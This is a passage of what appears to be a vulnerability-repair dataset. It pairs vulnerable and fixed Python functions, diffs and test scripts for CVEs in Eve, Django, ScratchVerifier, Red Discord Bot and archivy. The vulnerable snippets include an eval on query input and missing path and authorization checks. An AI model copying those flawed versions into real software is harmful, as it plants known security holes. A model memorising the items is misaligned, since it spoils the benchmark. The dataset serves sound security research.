    "cve_id": "CVE-2018-8097",
    "cve_description": "io/mongo/parser.py in Eve (aka pyeve) before 0.7.5 allows remote attackers to execute arbitrary code via Code Injection in the where parameter.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/pyeve/eve",
    "patch_url": [
      "https://github.com/pyeve/eve/commit/f8f7019ffdf9b4e05faf95e1f04e204aa4c91f98"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_221_1",
        "commit": "6d1526b",
        "file_path": "eve/io/mongo/parser.py",
        "start_line": 120,
        "end_line": 134,
        "snippet": "    def visit_Call(self, node):\n        \"\"\" A couple function calls are supported: bson's ObjectId() and\n        datetime().\n        \"\"\"\n        if isinstance(node.func, ast.Name):\n            expr = None\n            if node.func.id == 'ObjectId':\n                expr = \"('\" + node.args[0].s + \"')\"\n            elif node.func.id == 'datetime':\n                values = []\n                for arg in node.args:\n                    values.append(str(arg.n))\n                expr = \"(\" + \", \".join(values) + \")\"\n            if expr:\n                self.current_value = eval(node.func.id + expr)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_221_1",
        "commit": "f8f7019",
        "file_path": "eve/io/mongo/parser.py",
        "start_line": 120,
        "end_line": 137,
        "snippet": "    def visit_Call(self, node):\n        \"\"\" A couple function calls are supported: bson's ObjectId() and\n        datetime().\n        \"\"\"\n        if isinstance(node.func, ast.Name):\n            if node.func.id == 'ObjectId':\n                try:\n                    self.current_value = ObjectId(node.args[0].s)\n                except:\n                    pass\n            elif node.func.id == 'datetime':\n                values = []\n                for arg in node.args:\n                    values.append(arg.n)\n                try:\n                    self.current_value = datetime(*values)\n                except:\n                    pass"
      }
    ],
    "vul_patch": "--- a/eve/io/mongo/parser.py\n+++ b/eve/io/mongo/parser.py\n@@ -3,13 +3,16 @@\n         datetime().\n         \"\"\"\n         if isinstance(node.func, ast.Name):\n-            expr = None\n             if node.func.id == 'ObjectId':\n-                expr = \"('\" + node.args[0].s + \"')\"\n+                try:\n+                    self.current_value = ObjectId(node.args[0].s)\n+                except:\n+                    pass\n             elif node.func.id == 'datetime':\n                 values = []\n                 for arg in node.args:\n-                    values.append(str(arg.n))\n-                expr = \"(\" + \", \".join(values) + \")\"\n-            if expr:\n-                self.current_value = eval(node.func.id + expr)\n+                    values.append(arg.n)\n+                try:\n+                    self.current_value = datetime(*values)\n+                except:\n+                    pass\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-39330",
    "cve_description": "An issue was discovered in Django 5.0 before 5.0.7 and 4.2 before 4.2.14. Derived classes of the django.core.files.storage.Storage base class, when they override generate_filename() without replicating the file-path validations from the parent class, potentially allow directory traversal via certain inputs during a save() call. (Built-in Storage sub-classes are unaffected.)",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/django/django",
    "patch_url": [
      "https://github.com/django/django/commit/9f4f63e9ebb7bf6cb9547ee4e2526b9b96703270",
      "https://github.com/django/django/commit/2b00edc0151a660d1eb86da4059904a0fc4e095e"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_4_1",
        "commit": "156d318",
        "file_path": "django/core/files/storage/base.py",
        "start_line": 24,
        "end_line": 41,
        "snippet": "    def save(self, name, content, max_length=None):\n        \"\"\"\n        Save new content to the file specified by name. The content should be\n        a proper File object or any Python file-like object, ready to be read\n        from the beginning.\n        \"\"\"\n        # Get the proper name for the file, as it will actually be saved.\n        if name is None:\n            name = content.name\n\n        if not hasattr(content, \"chunks\"):\n            content = File(content, name)\n\n        name = self.get_available_name(name, max_length=max_length)\n        name = self._save(name, content)\n        # Ensure that the name returned from the storage system is still valid.\n        validate_file_name(name, allow_relative_path=True)\n        return name"
      },
      {
        "id": "vul_py_4_2",
        "commit": "156d318",
        "file_path": "django/core/files/utils.py",
        "start_line": 7,
        "end_line": 24,
        "snippet": "def validate_file_name(name, allow_relative_path=False):\n    # Remove potentially dangerous names\n    if os.path.basename(name) in {\"\", \".\", \"..\"}:\n        raise SuspiciousFileOperation(\"Could not derive file name from '%s'\" % name)\n\n    if allow_relative_path:\n        # Use PurePosixPath() because this branch is checked only in\n        # FileField.generate_filename() where all file paths are expected to be\n        # Unix style (with forward slashes).\n        path = pathlib.PurePosixPath(name)\n        if path.is_absolute() or \"..\" in path.parts:\n            raise SuspiciousFileOperation(\n                \"Detected path traversal attempt in '%s'\" % name\n            )\n    elif name != os.path.basename(name):\n        raise SuspiciousFileOperation(\"File name '%s' includes path elements\" % name)\n\n    return name"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_4_1",
        "commit": "2b00edc0151a660d1eb86da4059904a0fc4e095e",
        "file_path": "django/core/files/storage/base.py",
        "start_line": 24,
        "end_line": 52,
        "snippet": "    def save(self, name, content, max_length=None):\n        \"\"\"\n        Save new content to the file specified by name. The content should be\n        a proper File object or any Python file-like object, ready to be read\n        from the beginning.\n        \"\"\"\n        # Get the proper name for the file, as it will actually be saved.\n        if name is None:\n            name = content.name\n\n        if not hasattr(content, \"chunks\"):\n            content = File(content, name)\n\n        # Ensure that the name is valid, before and after having the storage\n        # system potentially modifying the name. This duplicates the check made\n        # inside `get_available_name` but it's necessary for those cases where\n        # `get_available_name` is overriden and validation is lost.\n        validate_file_name(name, allow_relative_path=True)\n\n        # Potentially find a different name depending on storage constraints.\n        name = self.get_available_name(name, max_length=max_length)\n        # Validate the (potentially) new name.\n        validate_file_name(name, allow_relative_path=True)\n\n        # The save operation should return the actual name of the file saved.\n        name = self._save(name, content)\n        # Ensure that the name returned from the storage system is still valid.\n        validate_file_name(name, allow_relative_path=True)\n        return name"
      },
      {
        "id": "fix_py_4_2",
        "commit": "2b00edc0151a660d1eb86da4059904a0fc4e095e",
        "file_path": "django/core/files/utils.py",
        "start_line": 7,
        "end_line": 23,
        "snippet": "def validate_file_name(name, allow_relative_path=False):\n    # Remove potentially dangerous names\n    if os.path.basename(name) in {\"\", \".\", \"..\"}:\n        raise SuspiciousFileOperation(\"Could not derive file name from '%s'\" % name)\n\n    if allow_relative_path:\n        # Ensure that name can be treated as a pure posix path, i.e. Unix\n        # style (with forward slashes).\n        path = pathlib.PurePosixPath(str(name).replace(\"\\\\\", \"/\"))\n        if path.is_absolute() or \"..\" in path.parts:\n            raise SuspiciousFileOperation(\n                \"Detected path traversal attempt in '%s'\" % name\n            )\n    elif name != os.path.basename(name):\n        raise SuspiciousFileOperation(\"File name '%s' includes path elements\" % name)\n\n    return name"
      }
    ],
    "vul_patch": "--- a/django/core/files/storage/base.py\n+++ b/django/core/files/storage/base.py\n@@ -11,7 +11,18 @@\n         if not hasattr(content, \"chunks\"):\n             content = File(content, name)\n \n+        # Ensure that the name is valid, before and after having the storage\n+        # system potentially modifying the name. This duplicates the check made\n+        # inside `get_available_name` but it's necessary for those cases where\n+        # `get_available_name` is overriden and validation is lost.\n+        validate_file_name(name, allow_relative_path=True)\n+\n+        # Potentially find a different name depending on storage constraints.\n         name = self.get_available_name(name, max_length=max_length)\n+        # Validate the (potentially) new name.\n+        validate_file_name(name, allow_relative_path=True)\n+\n+        # The save operation should return the actual name of the file saved.\n         name = self._save(name, content)\n         # Ensure that the name returned from the storage system is still valid.\n         validate_file_name(name, allow_relative_path=True)\n\n--- a/django/core/files/utils.py\n+++ b/django/core/files/utils.py\n@@ -4,10 +4,9 @@\n         raise SuspiciousFileOperation(\"Could not derive file name from '%s'\" % name)\n \n     if allow_relative_path:\n-        # Use PurePosixPath() because this branch is checked only in\n-        # FileField.generate_filename() where all file paths are expected to be\n-        # Unix style (with forward slashes).\n-        path = pathlib.PurePosixPath(name)\n+        # Ensure that name can be treated as a pure posix path, i.e. Unix\n+        # style (with forward slashes).\n+        path = pathlib.PurePosixPath(str(name).replace(\"\\\\\", \"/\"))\n         if path.is_absolute() or \"..\" in path.parts:\n             raise SuspiciousFileOperation(\n                 \"Detected path traversal attempt in '%s'\" % name\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2024-39330:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2024-39330/bin/python ./runtests.py file_storage.test_base file_storage.tests.FileStorageTests.test_file_save_broken_symlink file_uploads.tests.DirectoryCreationTests.test_not_a_directory",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2024-39330:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/fix.patch /workspace/dep.patch\ncd tests && /workspace/PoC_env/CVE-2024-39330/bin/python ./runtests.py file_storage.tests file_uploads.tests"
  },
  {
    "cve_id": "CVE-2020-26236",
    "cve_description": "In ScratchVerifier before commit a603769, an attacker can hijack the verification process to log into someone else's account on any site that uses ScratchVerifier for logins. A possible exploitation would follow these steps: 1. User starts login process. 2. Attacker attempts login for user, and is given the same verification code. 3. User comments code as part of their normal login. 4. Before user can, attacker completes the login process now that the code is commented. 5. User gets a failed login and attacker now has control of the account. Since commit a603769 starting a login twice will generate different verification codes, causing both user and attacker login to fail. For clients that rely on a clone of ScratchVerifier not hosted by the developers, their users may attempt to finish the login process as soon as possible after commenting the code. There is no reliable way for the attacker to know before the user can finish the process that the user has commented the code, so this vulnerability only really affects those who comment the code and then take several seconds before finishing the login.",
    "cwe_info": {
      "CWE-287": {
        "name": "Improper Authentication",
        "description": "When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct."
      }
    },
    "repo": "https://github.com/ScratchVerifier/ScratchVerifier",
    "patch_url": [
      "https://github.com/ScratchVerifier/ScratchVerifier/commit/a603769010abf8c1bede91af46e4945314e4aa4a"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_379_1",
        "commit": "2170fc56a64aeb40a0936702a9c3281f716c6405",
        "file_path": "backend/db.py",
        "start_line": 160,
        "end_line": 185,
        "snippet": "    async def start_verification(self, client_id, username):\n        async with self.lock:\n            await self.db.execute('SELECT code FROM scratchverifier_usage WHERE \\\nclient_id=? AND username=?', (client_id, username))\n            row = await self.db.fetchone()\n        if row is not None:\n            await self.db.execute('UPDATE scratchverifier_usage SET expiry=? \\\nWHERE client_id=? AND username=? AND code=?', (int(time.time()) + VERIFY_EXPIRY,\n                                               client_id, username, row[0]))\n            return row[0]\n        code = sha256(\n            str(client_id).encode()\n            + str(time.time()).encode()\n            + username.encode()\n            + token_bytes()\n        # 0->A, 1->B, etc, to avoid Scratch's phone number censor\n        ).hexdigest().translate({ord('0') + i: ord('A') + i for i in range(10)})\n        await self.db.execute('INSERT INTO scratchverifier_usage (client_id, \\\ncode, username, expiry) VALUES (?, ?, ?, ?)', (client_id, code, username,\n                               int(time.time() + VERIFY_EXPIRY)))\n        await self.db.execute('INSERT INTO scratchverifier_logs (client_id, \\\nusername, log_time, log_type) VALUES (?, ?, ?, ?)', (client_id, username,\n                                                     int(time.time()), 1))\n        await self.db.execute('DELETE FROM scratchverifier_usage WHERE \\\nexpiry<=?', (int(time.time()),))\n        return code"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_379_1",
        "commit": "a603769010abf8c1bede91af46e4945314e4aa4a",
        "file_path": "backend/db.py",
        "start_line": 160,
        "end_line": 186,
        "snippet": "    async def start_verification(self, client_id, username):\n        async with self.lock:\n            await self.db.execute('SELECT code FROM scratchverifier_usage WHERE \\\nclient_id=? AND username=?', (client_id, username))\n            row = await self.db.fetchone()\n        code = sha256(\n            str(client_id).encode()\n            + str(time.time()).encode()\n            + username.encode()\n            + token_bytes()\n        # 0->A, 1->B, etc, to avoid Scratch's phone number censor\n        ).hexdigest().translate({ord('0') + i: ord('A') + i for i in range(10)})\n        if row is not None:\n            await self.db.execute(\n                'UPDATE scratchverifier_usage SET expiry=?, code=? \\\nWHERE client_id=? AND username=?', (int(time.time()) + VERIFY_EXPIRY,\n                                    code, client_id, username))\n            return code\n        await self.db.execute('INSERT INTO scratchverifier_usage (client_id, \\\ncode, username, expiry) VALUES (?, ?, ?, ?)', (client_id, code, username,\n                               int(time.time() + VERIFY_EXPIRY)))\n        await self.db.execute('INSERT INTO scratchverifier_logs (client_id, \\\nusername, log_time, log_type) VALUES (?, ?, ?, ?)', (client_id, username,\n                                                     int(time.time()), 1))\n        await self.db.execute('DELETE FROM scratchverifier_usage WHERE \\\nexpiry<=?', (int(time.time()),))\n        return code"
      }
    ],
    "vul_patch": "--- a/backend/db.py\n+++ b/backend/db.py\n@@ -3,11 +3,6 @@\n             await self.db.execute('SELECT code FROM scratchverifier_usage WHERE \\\n client_id=? AND username=?', (client_id, username))\n             row = await self.db.fetchone()\n-        if row is not None:\n-            await self.db.execute('UPDATE scratchverifier_usage SET expiry=? \\\n-WHERE client_id=? AND username=? AND code=?', (int(time.time()) + VERIFY_EXPIRY,\n-                                               client_id, username, row[0]))\n-            return row[0]\n         code = sha256(\n             str(client_id).encode()\n             + str(time.time()).encode()\n@@ -15,6 +10,12 @@\n             + token_bytes()\n         # 0->A, 1->B, etc, to avoid Scratch's phone number censor\n         ).hexdigest().translate({ord('0') + i: ord('A') + i for i in range(10)})\n+        if row is not None:\n+            await self.db.execute(\n+                'UPDATE scratchverifier_usage SET expiry=?, code=? \\\n+WHERE client_id=? AND username=?', (int(time.time()) + VERIFY_EXPIRY,\n+                                    code, client_id, username))\n+            return code\n         await self.db.execute('INSERT INTO scratchverifier_usage (client_id, \\\n code, username, expiry) VALUES (?, ?, ?, ?)', (client_id, code, username,\n                                int(time.time() + VERIFY_EXPIRY)))\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2020-15278",
    "cve_description": "Red Discord Bot before version 3.4.1 has an unauthorized privilege escalation exploit in the Mod module. This exploit allows Discord users with a high privilege level within the guild to bypass hierarchy checks when the application is in a specific condition that is beyond that user's control. By abusing this exploit, it is possible to perform destructive actions within the guild the user has high privileges in. This exploit has been fixed in version 3.4.1. As a workaround, unloading the Mod module with unload mod or, disabling the massban command with command disable global massban can render this exploit not accessible. We still highly recommend updating to 3.4.1 to completely patch this issue.",
    "cwe_info": {
      "CWE-285": {
        "name": "Improper Authorization",
        "description": "The product does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-863": {
        "name": "Incorrect Authorization",
        "description": "The product performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check."
      },
      "CWE-250": {
        "name": "Execution with Unnecessary Privileges",
        "description": "The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses."
      },
      "CWE-269": {
        "name": "Improper Privilege Management",
        "description": "The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor."
      }
    },
    "repo": "https://github.com/Cog-Creators/Red-DiscordBot",
    "patch_url": [
      "https://github.com/Cog-Creators/Red-DiscordBot/commit/726bfd38adfdfaef760412a68e01447b470f438b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_62_1",
        "commit": "21f9a6f",
        "file_path": "redbot/cogs/mod/kickban.py",
        "start_line": 369,
        "end_line": 514,
        "snippet": "    async def massban(\n        self,\n        ctx: commands.Context,\n        user_ids: commands.Greedy[RawUserIds],\n        days: Optional[int] = None,\n        *,\n        reason: str = None,\n    ):\n        \"\"\"Mass bans user(s) from the server.\n\n        User IDs need to be provided in order to ban\n        using this command.\"\"\"\n        banned = []\n        errors = {}\n        upgrades = []\n\n        async def show_results():\n            text = _(\"Banned {num} users from the server.\").format(\n                num=humanize_number(len(banned))\n            )\n            if errors:\n                text += _(\"\\nErrors:\\n\")\n                text += \"\\n\".join(errors.values())\n            if upgrades:\n                text += _(\n                    \"\\nFollowing user IDs have been upgraded from a temporary to a permanent ban:\\n\"\n                )\n                text += humanize_list(upgrades)\n\n            for p in pagify(text):\n                await ctx.send(p)\n\n        def remove_processed(ids):\n            return [_id for _id in ids if _id not in banned and _id not in errors]\n\n        user_ids = list(set(user_ids))  # No dupes\n\n        author = ctx.author\n        guild = ctx.guild\n\n        if not user_ids:\n            await ctx.send_help()\n            return\n\n        if days is None:\n            days = await self.config.guild(guild).default_days()\n\n        if not (0 <= days <= 7):\n            await ctx.send(_(\"Invalid days. Must be between 0 and 7.\"))\n            return\n\n        if not guild.me.guild_permissions.ban_members:\n            return await ctx.send(_(\"I lack the permissions to do this.\"))\n\n        tempbans = await self.config.guild(guild).current_tempbans()\n\n        ban_list = await guild.bans()\n        for entry in ban_list:\n            for user_id in user_ids:\n                if entry.user.id == user_id:\n                    if user_id in tempbans:\n                        # We need to check if a user is tempbanned here because otherwise they won't be processed later on.\n                        continue\n                    else:\n                        errors[user_id] = _(\"User with ID {user_id} is already banned.\").format(\n                            user_id=user_id\n                        )\n\n        user_ids = remove_processed(user_ids)\n\n        if not user_ids:\n            await show_results()\n            return\n\n        for user_id in user_ids:\n            user = guild.get_member(user_id)\n            if user is not None:\n                if user_id in tempbans:\n                    # We need to check if a user is tempbanned here because otherwise they won't be processed later on.\n                    continue\n                else:\n                    # Instead of replicating all that handling... gets attr from decorator\n                    try:\n                        success, reason = await self.ban_user(\n                            user=user, ctx=ctx, days=days, reason=reason, create_modlog_case=True\n                        )\n                        if success:\n                            banned.append(user_id)\n                        else:\n                            errors[user_id] = _(\"Failed to ban user {user_id}: {reason}\").format(\n                                user_id=user_id, reason=reason\n                            )\n                    except Exception as e:\n                        errors[user_id] = _(\"Failed to ban user {user_id}: {reason}\").format(\n                            user_id=user_id, reason=e\n                        )\n\n        user_ids = remove_processed(user_ids)\n\n        if not user_ids:\n            await show_results()\n            return\n\n        for user_id in user_ids:\n            user = discord.Object(id=user_id)\n            audit_reason = get_audit_reason(author, reason)\n            queue_entry = (guild.id, user_id)\n            async with self.config.guild(guild).current_tempbans() as tempbans:\n                if user_id in tempbans:\n                    tempbans.remove(user_id)\n                    upgrades.append(str(user_id))\n                    log.info(\n                        \"{}({}) upgraded the tempban for {} to a permaban.\".format(\n                            author.name, author.id, user_id\n                        )\n                    )\n                    banned.append(user_id)\n                else:\n                    try:\n                        await guild.ban(user, reason=audit_reason, delete_message_days=days)\n                        log.info(\"{}({}) hackbanned {}\".format(author.name, author.id, user_id))\n                    except discord.NotFound:\n                        errors[user_id] = _(\"User with ID {user_id} not found\").format(\n                            user_id=user_id\n                        )\n                        continue\n                    except discord.Forbidden:\n                        errors[user_id] = _(\n                            \"Could not ban user with ID {user_id}: missing permissions.\"\n                        ).format(user_id=user_id)\n                        continue\n                    else:\n                        banned.append(user_id)\n\n            await modlog.create_case(\n                self.bot,\n                guild,\n                ctx.message.created_at.replace(tzinfo=timezone.utc),\n                \"hackban\",\n                user_id,\n                author,\n                reason,\n                until=None,\n                channel=None,\n            )\n        await show_results()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_62_1",
        "commit": "726bfd38adfdfaef760412a68e01447b470f438b",
        "file_path": "redbot/cogs/mod/kickban.py",
        "start_line": 369,
        "end_line": 527,
        "snippet": "    async def massban(\n        self,\n        ctx: commands.Context,\n        user_ids: commands.Greedy[RawUserIds],\n        days: Optional[int] = None,\n        *,\n        reason: str = None,\n    ):\n        \"\"\"Mass bans user(s) from the server.\n\n        User IDs need to be provided in order to ban\n        using this command.\"\"\"\n        banned = []\n        errors = {}\n        upgrades = []\n\n        async def show_results():\n            text = _(\"Banned {num} users from the server.\").format(\n                num=humanize_number(len(banned))\n            )\n            if errors:\n                text += _(\"\\nErrors:\\n\")\n                text += \"\\n\".join(errors.values())\n            if upgrades:\n                text += _(\n                    \"\\nFollowing user IDs have been upgraded from a temporary to a permanent ban:\\n\"\n                )\n                text += humanize_list(upgrades)\n\n            for p in pagify(text):\n                await ctx.send(p)\n\n        def remove_processed(ids):\n            return [_id for _id in ids if _id not in banned and _id not in errors]\n\n        user_ids = list(set(user_ids))  # No dupes\n\n        author = ctx.author\n        guild = ctx.guild\n\n        if not user_ids:\n            await ctx.send_help()\n            return\n\n        if days is None:\n            days = await self.config.guild(guild).default_days()\n\n        if not (0 <= days <= 7):\n            await ctx.send(_(\"Invalid days. Must be between 0 and 7.\"))\n            return\n\n        if not guild.me.guild_permissions.ban_members:\n            return await ctx.send(_(\"I lack the permissions to do this.\"))\n\n        tempbans = await self.config.guild(guild).current_tempbans()\n\n        ban_list = await guild.bans()\n        for entry in ban_list:\n            for user_id in user_ids:\n                if entry.user.id == user_id:\n                    if user_id in tempbans:\n                        # We need to check if a user is tempbanned here because otherwise they won't be processed later on.\n                        continue\n                    else:\n                        errors[user_id] = _(\"User with ID {user_id} is already banned.\").format(\n                            user_id=user_id\n                        )\n\n        user_ids = remove_processed(user_ids)\n\n        if not user_ids:\n            await show_results()\n            return\n\n        # We need to check here, if any of the users isn't a member and if they are,\n        # we need to use our `ban_user()` method to do hierarchy checks.\n        members: Dict[int, discord.Member] = {}\n        to_query: List[int] = []\n\n        for user_id in user_ids:\n            member = guild.get_member(user_id)\n            if member is not None:\n                members[user_id] = member\n            elif not guild.chunked:\n                to_query.append(user_id)\n\n        # If guild isn't chunked, we might possibly be missing the member from cache,\n        # so we need to make sure that isn't the case by querying the user IDs for such guilds.\n        while to_query:\n            queried_members = await guild.query_members(user_ids=to_query[:100], limit=100)\n            members.update((member.id, member) for member in queried_members)\n            to_query = to_query[100:]\n\n        # Call `ban_user()` method for all users that turned out to be guild members.\n        for member in members:\n            try:\n                success, reason = await self.ban_user(\n                    user=member, ctx=ctx, days=days, reason=reason, create_modlog_case=True\n                )\n                if success:\n                    banned.append(user_id)\n                else:\n                    errors[user_id] = _(\"Failed to ban user {user_id}: {reason}\").format(\n                        user_id=user_id, reason=reason\n                    )\n            except Exception as e:\n                errors[user_id] = _(\"Failed to ban user {user_id}: {reason}\").format(\n                    user_id=user_id, reason=e\n                )\n\n        user_ids = remove_processed(user_ids)\n\n        if not user_ids:\n            await show_results()\n            return\n\n        for user_id in user_ids:\n            user = discord.Object(id=user_id)\n            audit_reason = get_audit_reason(author, reason)\n            queue_entry = (guild.id, user_id)\n            async with self.config.guild(guild).current_tempbans() as tempbans:\n                if user_id in tempbans:\n                    tempbans.remove(user_id)\n                    upgrades.append(str(user_id))\n                    log.info(\n                        \"{}({}) upgraded the tempban for {} to a permaban.\".format(\n                            author.name, author.id, user_id\n                        )\n                    )\n                    banned.append(user_id)\n                else:\n                    try:\n                        await guild.ban(user, reason=audit_reason, delete_message_days=days)\n                        log.info(\"{}({}) hackbanned {}\".format(author.name, author.id, user_id))\n                    except discord.NotFound:\n                        errors[user_id] = _(\"User with ID {user_id} not found\").format(\n                            user_id=user_id\n                        )\n                        continue\n                    except discord.Forbidden:\n                        errors[user_id] = _(\n                            \"Could not ban user with ID {user_id}: missing permissions.\"\n                        ).format(user_id=user_id)\n                        continue\n                    else:\n                        banned.append(user_id)\n\n            await modlog.create_case(\n                self.bot,\n                guild,\n                ctx.message.created_at.replace(tzinfo=timezone.utc),\n                \"hackban\",\n                user_id,\n                author,\n                reason,\n                until=None,\n                channel=None,\n            )\n        await show_results()"
      }
    ],
    "vul_patch": "--- a/redbot/cogs/mod/kickban.py\n+++ b/redbot/cogs/mod/kickban.py\n@@ -72,28 +72,41 @@\n             await show_results()\n             return\n \n+        # We need to check here, if any of the users isn't a member and if they are,\n+        # we need to use our `ban_user()` method to do hierarchy checks.\n+        members: Dict[int, discord.Member] = {}\n+        to_query: List[int] = []\n+\n         for user_id in user_ids:\n-            user = guild.get_member(user_id)\n-            if user is not None:\n-                if user_id in tempbans:\n-                    # We need to check if a user is tempbanned here because otherwise they won't be processed later on.\n-                    continue\n+            member = guild.get_member(user_id)\n+            if member is not None:\n+                members[user_id] = member\n+            elif not guild.chunked:\n+                to_query.append(user_id)\n+\n+        # If guild isn't chunked, we might possibly be missing the member from cache,\n+        # so we need to make sure that isn't the case by querying the user IDs for such guilds.\n+        while to_query:\n+            queried_members = await guild.query_members(user_ids=to_query[:100], limit=100)\n+            members.update((member.id, member) for member in queried_members)\n+            to_query = to_query[100:]\n+\n+        # Call `ban_user()` method for all users that turned out to be guild members.\n+        for member in members:\n+            try:\n+                success, reason = await self.ban_user(\n+                    user=member, ctx=ctx, days=days, reason=reason, create_modlog_case=True\n+                )\n+                if success:\n+                    banned.append(user_id)\n                 else:\n-                    # Instead of replicating all that handling... gets attr from decorator\n-                    try:\n-                        success, reason = await self.ban_user(\n-                            user=user, ctx=ctx, days=days, reason=reason, create_modlog_case=True\n-                        )\n-                        if success:\n-                            banned.append(user_id)\n-                        else:\n-                            errors[user_id] = _(\"Failed to ban user {user_id}: {reason}\").format(\n-                                user_id=user_id, reason=reason\n-                            )\n-                    except Exception as e:\n-                        errors[user_id] = _(\"Failed to ban user {user_id}: {reason}\").format(\n-                            user_id=user_id, reason=e\n-                        )\n+                    errors[user_id] = _(\"Failed to ban user {user_id}: {reason}\").format(\n+                        user_id=user_id, reason=reason\n+                    )\n+            except Exception as e:\n+                errors[user_id] = _(\"Failed to ban user {user_id}: {reason}\").format(\n+                    user_id=user_id, reason=e\n+                )\n \n         user_ids = remove_processed(user_ids)\n \n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2020-15278:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/Red-DiscordBot\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2020-15278/bin/python  hand_test.py\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2020-15278:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/Red-DiscordBot\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2020-15278/bin/python -m pytest tests/cogs/ -v -k \"not test_git_get_full_sha1_from_ambiguous_tag_and_commit and not test_git_get_full_sha1_from_ambiguous_commits\"  --asyncio-mode=auto"
  },
  {
    "cve_id": "CVE-2022-0697",
    "cve_description": "Open Redirect in GitHub repository archivy/archivy prior to 1.7.0.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/archivy/archivy",
    "patch_url": [
      "https://github.com/archivy/archivy/commit/2d8cb29853190d42572b36deb61127e68d6be574"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_319_1",
        "commit": "fa389e7",
        "file_path": "archivy/routes.py",
        "start_line": "41",
        "end_line": "271",
        "snippet": "@app.before_request\ndef check_perms():\n    allowed_path = (\n        request.path.startswith(\"/login\")\n        or request.path.startswith(\"/static\")\n        or request.path.startswith(\"/api/login\")\n    )\n    if not current_user.is_authenticated and not allowed_path:\n        return redirect(url_for(\"login\", next=request.path))\n    return\n\n\n@app.route(\"/\")\n@app.route(\"/index\")\ndef index():\n    path = request.args.get(\"path\", \"\").lstrip(\"/\")\n    try:\n        files = data.get_items(path=path)\n    except FileNotFoundError:\n        flash(\"Directory does not exist.\", \"error\")\n        return redirect(\"/\")\n\n    return render_template(\n        \"home.html\",\n        title=path or \"root\",\n        search_enabled=app.config[\"SEARCH_CONF\"][\"enabled\"],\n        dir=files,\n        current_path=path,\n        new_folder_form=forms.NewFolderForm(),\n        delete_form=forms.DeleteFolderForm(),\n        rename_form=forms.RenameDirectoryForm(),\n        view_only=0,\n        search_engine=app.config[\"SEARCH_CONF\"][\"engine\"],\n    )\n\n\n# TODO: refactor two following methods\n@app.route(\"/bookmarks/new\", methods=[\"GET\", \"POST\"])\ndef new_bookmark():\n    default_dir = app.config.get(\"DEFAULT_BOOKMARKS_DIR\", \"root directory\")\n    form = forms.NewBookmarkForm(path=default_dir)\n    form.path.choices = [(\"\", \"root directory\")] + [\n        (pathname, pathname) for pathname in data.get_dirs()\n    ]\n    if form.validate_on_submit():\n        path = form.path.data\n        tags = form.tags.data.split(\",\") if form.tags.data != \"\" else []\n        tags = [tag.strip() for tag in tags]\n        bookmark = DataObj(url=form.url.data, tags=tags, path=path, type=\"bookmark\")\n        bookmark.process_bookmark_url()\n        bookmark_id = bookmark.insert()\n        if bookmark_id:\n            flash(\"Bookmark Saved!\", \"success\")\n            return redirect(f\"/dataobj/{bookmark_id}\")\n        else:\n            flash(bookmark.error, \"error\")\n            return redirect(\"/bookmarks/new\")\n    # for bookmarklet\n    form.url.data = request.args.get(\"url\", \"\")\n    path = request.args.get(\"path\", default_dir).strip(\"/\")\n    # handle empty argument\n    form.path.data = path\n    return render_template(\"dataobjs/new.html\", 